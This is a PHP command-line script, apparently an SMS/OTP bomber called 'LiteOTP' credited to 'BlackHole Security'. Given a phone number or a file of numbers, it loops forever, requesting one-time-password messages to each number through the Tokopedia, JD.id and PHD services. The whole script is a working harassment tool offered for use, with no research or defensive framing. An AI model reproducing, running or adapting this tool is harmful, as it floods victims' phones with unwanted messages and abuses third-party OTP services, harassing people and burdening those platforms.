<?php

require __DIR__.'/vendor/autoload.php';
use Cvar1984\LiteOtp\Otp;

if (strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = '';
    $RR = '';
    $G  = '';
    $GG = '';
    $B  = '';
    $BB = '';
    $Y  = '';
    $YY = '';
    $X  = '';
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m";
}

echo $Y
    . '
 _     _ _        ___ _____ ____
| |   (_) |_ ___ / _ \_   _|  _ \
| |   | | __/ _ \ | | || | | |_) |
| |___| | ||  __/ |_| || | |  __/
|_____|_|\__\___|\___/ |_| |_|';
echo $R . "\n" . '++++++++++++++++++++++++++++++++++++++';
echo $B . "\n" . 'Author  : Cvar1984                   ' . $R . '+';
echo $B . "\n" . 'Github  : https://github.com/Cvar1984' . $R . '+';
echo $B . "\n" . 'Team    : BlackHole Security         ' . $R . '+';
echo $B . "\n" . 'Version : 2.6                        ' . $R . '+';
echo $B . "\n" . 'Date    : 13-03-2018                 ' . $R . '+';
echo $R . "\n" . '++++++++++++++++++++++++++++++++++++++' . $G . $X . "\n";
try {
    if ($argc < 2) {
        throw new Exception('Input No List');
    }
    $bom = new Otp();
    if (is_numeric($argv[1])) {
        $bom->sendOtp((int)$argv[1], 'tokopedia');
        while (1) {
            fprintf(STDOUT, '%sSend OTP to %s[%s]%s%s', $G, $Y, $argv[1], $X, PHP_EOL);
            $bom->sendOtp((int)$argv[1], 'jdid');
            $bom->sendOtp((int)$argv[1], 'phd');
        }
    } else if (file_exists($argv[1])) {
        $argv[1] = file_get_contents($argv[1]);
        $argv[1] = trim($argv[1], " \t\n\r\0\x0B"); //remove whitespace
        $argv[1] = explode("\n", $argv[1]);
        $count = sizeof($argv[1]);
        while (1) {
            for ($x = 0; $x < $count; $x++) {
                fprintf(STDOUT, '%sSend OTP to %s[%s]%s%s', $G, $Y, $argv[1][$x], $X, PHP_EOL);
                $bom->sendOtp((int)$argv[1][$x], 'tokopedia');
                $bom->sendOtp((int)$argv[1][$x], 'jdid');
                $bom->sendOtp((int)$argv[1][$x], 'phd');
            }
        }
    } else {
        throw new Exception('File not exist ' . $argv[1]);
    }
} catch (Exception $e) {
    fprintf(STDERR, "%s%s%s\n", $RR, $e->getMessage(), $X);
    exit(1);
}
